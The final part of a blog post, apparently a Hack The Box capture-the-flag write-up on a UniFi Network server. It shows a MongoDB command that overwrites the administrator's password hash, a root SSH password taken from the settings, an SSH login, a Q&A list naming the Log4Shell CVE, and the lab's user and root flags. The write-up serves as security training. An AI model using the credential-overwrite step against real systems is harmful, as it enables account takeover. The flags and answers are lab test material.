/posts/htb/startingpoint-tier2/images/db_hu13522594148675837295.webp 1024w" sizes=100vw src=images/db.png width=768 height=594 loading=lazy><figcaption></figcaption></figure></p><p>To update <code>administrator</code>&rsquo;s password to <code>unified</code>, we simply need to run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>mongo --port <span class=m>27117</span> ace --eval <span class=s1>&#39;db.admin.update({&#34;_id&#34;: ObjectId(&#34;61ce278f46e0fb0012d47ee4&#34;)},{$set:{&#34;x_shadow&#34;:&#34;$6$dDywalcPwNgl3LkM$Ex3SObZFkVQ5kMk4Cmur7I9qDDKOyLNLrYbHGqt0JGz49G8fRb9KIAvFMS3AS8jGuOU/4nY5H5OtNq9/Qmpl1&#34;}})&#39;</span>
</span></span></code></pre></div><p><figure class=image-caption><img alt=admin srcset="/posts/htb/startingpoint-tier2/images/admin_hu3186473363056619817.webp 480w,
/posts/htb/startingpoint-tier2/images/admin_hu12821805571117073336.webp 768w,
/posts/htb/startingpoint-tier2/images/admin_hu8233080416298015308.webp 1024w" sizes=100vw src=images/admin.png width=768 height=680 loading=lazy><figcaption></figcaption></figure>Bingo! <code>administrator:unified</code> got us in!</p><p>And under settings there&rsquo;s some valuable information!</p><p><figure class=image-caption><img alt=yes srcset="/posts/htb/startingpoint-tier2/images/yes_hu5000454762415067092.webp 480w,
/posts/htb/startingpoint-tier2/images/yes_hu11204158607284133472.webp 768w,
/posts/htb/startingpoint-tier2/images/yes_hu72723813382969185.webp 1024w" sizes=100vw src=images/yes.png width=768 height=679 loading=lazy><figcaption></figcaption></figure></p><p><code>root:NotACrackablePassword4U2022</code></p><p>Then just:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>ssh root@10.129.186.136
</span></span></code></pre></div><p>&mldr;and get the flag</p><h3 id=questions-3>Questions<a hidden class=anchor aria-hidden=true href=#questions-3>#</a></h3><ul><li>Which are the first four open ports? <code>22,6789,8080,8443</code></li><li>What is title of the software that is running running on port 8443? <code>UniFi Network</code></li><li>What is the version of the software that is running? <code>6.4.54</code></li><li>What is the CVE for the identified vulnerability? <code>CVE-2021-44228</code></li><li>What protocol does JNDI leverage in the injection? <code>ldap</code></li><li>What tool do we use to intercept the traffic, indicating the attack was successful? <code>tcpdump</code></li><li>What port do we need to inspect intercepted traffic for? <code>389</code></li><li>What port is the MongoDB service running on? <code>27117</code></li><li>What is the default database name for UniFi applications? <code>ace</code></li><li>What is the function we use to enumerate users within the database in MongoDB? <code>db.admin.find()</code></li><li>What is the function we use to update users within the database in MongoDB? <code>db.admin.update()</code></li><li>What is the password for the root user? <code>NotACrackablePassword4U2022</code></li></ul><p><strong>user flag</strong> <code>6ced1a6a89e666c0620cdb10262ba127</code></p><p><strong>root flag:</strong> <code>e50bc93c75b634e4b272d2f771c33681</code></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://woadey.xyz/tags/smb/>Smb</a></li><li><a href=https://woadey.xyz/tags/sql/>Sql</a></li><li><a href=https://woadey.xyz/tags/ssh/>Ssh</a></li><li><a href=https://woadey.xyz/tags/ftp/>Ftp</a></li></ul><nav class=paginav><a class=prev href=https://woadey.xyz/posts/cryptohack/symmetric_cryptography/><span class=title>« Prev</span><br><span>CryptoHack Writeup: Symmetric Cryptography</span>
</a><a class=next href=https://woadey.xyz/posts/cryptohack/modular_arithmetic/><span class=title>Next »</span><br><span>CryptoHack Writeup: Modular Arithmetic</span></a></nav></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>